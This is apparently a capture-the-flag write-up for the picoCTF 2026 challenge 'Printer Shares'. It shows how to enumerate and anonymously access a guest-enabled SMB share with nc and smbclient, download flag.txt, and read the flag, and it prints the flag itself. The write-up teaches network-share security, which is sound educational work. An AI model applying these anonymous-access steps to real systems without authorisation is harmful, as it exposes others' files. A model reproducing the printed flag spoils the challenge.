# Printer Shares
| **Platform** | picoCTF 2026 |
| **Category** | General Skills |
| **Difficulty** | Easy |
| **Author** | Janice He |
| **Topic** | SMB / Samba / Network Shares |

## Challenge
The challenge says:
```text
Oops! Someone accidentally sent an important file to a network printer—can you retrieve it from the print server?
The printer is on 50963.
```
The challenge gives us the server:
```text
mysterious-sea.picoctf.net
```
and port:
```text
50963
```
The hints are:
```text
1. knowing how SMB protocol works would be helpful!
2. smbclient and smbutil are good tools
```
The important observation is that the printer server exposes an **SMB share**.
We can enumerate the available SMB shares using `smbclient`.
## Step 1 – Check the Port
First, check whether the printer server is reachable:
```bash
nc -vz mysterious-sea.picoctf.net 50963
```
The connection succeeds:
```text
Connection to mysterious-sea.picoctf.net 50963 port [tcp/*] succeeded!
```
This confirms that the service is running.
## Step 2 – Enumerate SMB Shares
Use `smbclient` to list the available shares:
```bash
smbclient -L //mysterious-sea.picoctf.net -p 50963 -N
```
The `-L` option lists shares.
The `-p` option specifies the port.
The `-N` option tells `smbclient` not to request a password.
The output shows:
```text
Sharename       Type      Comment
---------       ----      -------
shares          Disk      Public Share With Guests
IPC$            IPC       IPC Service
```
The interesting share is:
```text
shares
```
## Step 3 – Connect to the SMB Share
Connect to the `shares` share:
```bash
smbclient //mysterious-sea.picoctf.net/shares -p 50963 -N
```
After connecting, we get an SMB prompt:
```text
smb: \>
```
## Step 4 – List the Files
Inside the SMB share, run:
```text
ls
```
The output contains:
```text
...
dummy.txt
flag.txt
```
The important file is:
```text
flag.txt
```
## Step 5 – Download the Flag
Use the SMB `get` command:
```text
get flag.txt
```
This downloads the remote file to our local machine.
The output confirms:
```text
getting file \flag.txt of size 37
```
Now exit the SMB session:
```text
exit
```
## Step 6 – Read the Downloaded File
After returning to the normal terminal, run:
```bash
cat flag.txt
```
The file contains:
```text
picoCTF{5mb_pr1nter_5h4re5_8caa47ce}
```
Therefore, the flag is:
```text
picoCTF{5mb_pr1nter_5h4re5_8caa47ce}
```
## Why This Works
The challenge simulates a network printer exposing an SMB share.
SMB (Server Message Block) is a network protocol commonly used for sharing files and resources.
The server exposes a public SMB share:
```text
shares
```
Because guest access is allowed, we can connect without providing credentials.
The workflow is:
```text
Find the SMB service
        ↓
Enumerate SMB shares
        ↓
Find the "shares" share
        ↓
Connect anonymously
        ↓
List files
        ↓
Find flag.txt
        ↓
Download flag.txt
        ↓
Read the flag
```
## Important SMB Commands
### List Shares
```bash
smbclient -L //mysterious-sea.picoctf.net -p 50963 -N
```
### Connect to a Share
```bash
smbclient //mysterious-sea.picoctf.net/shares -p 50963 -N
```
### List Files
Inside `smbclient`:
```text
ls
```
### Download a File
```text
get flag.txt
```
### Exit
```text
exit
```
## Commands Used
Check the service:
```bash
nc -vz mysterious-sea.picoctf.net 50963
```
Enumerate SMB shares:
```bash
smbclient -L //mysterious-sea.picoctf.net -p 50963 -N
```
Connect to the share:
```bash
smbclient //mysterious-sea.picoctf.net/shares -p 50963 -N
```
Inside SMB:
```text
ls
get flag.txt
exit
```
Read the downloaded file:
```bash
cat flag.txt
```
## Complete Solution
```text
nc -vz mysterious-sea.picoctf.net 50963
        ↓
Check that the SMB service is reachable
        ↓
smbclient -L //mysterious-sea.picoctf.net -p 50963 -N
        ↓
Find the "shares" SMB share
        ↓
smbclient //mysterious-sea.picoctf.net/shares -p 50963 -N
        ↓
ls
        ↓
Find flag.txt
        ↓
get flag.txt
        ↓
exit
        ↓
cat flag.txt
        ↓
Get the flag
```

## One-Line Command Sequence

```bash
nc -vz mysterious-sea.picoctf.net 50963 && smbclient //mysterious-sea.picoctf.net/shares -p 50963 -N
```
Then inside `smbclient`:
```text
ls
get flag.txt
exit
```
Finally:
```bash
cat flag.txt
```
## Flag
```text
picoCTF{5mb_pr1nter_5h4re5_8caa47ce}
```
## Tools Used
- Linux Terminal
- Netcat (`nc`)
- SMB
- Samba
- `smbclient`
- Anonymous SMB acces
## Key Learning
- SMB can be used to share files over a network.
- `smbclient -L` can enumerate SMB shares.
- `-N` allows an anonymous connection when guest access is enabled.
- The `get` command downloads files from an SMB share.
- Network services should always be enumerated before attempting exploitation.
- Public SMB shares can expose sensitive files if permissions are misconfigured.
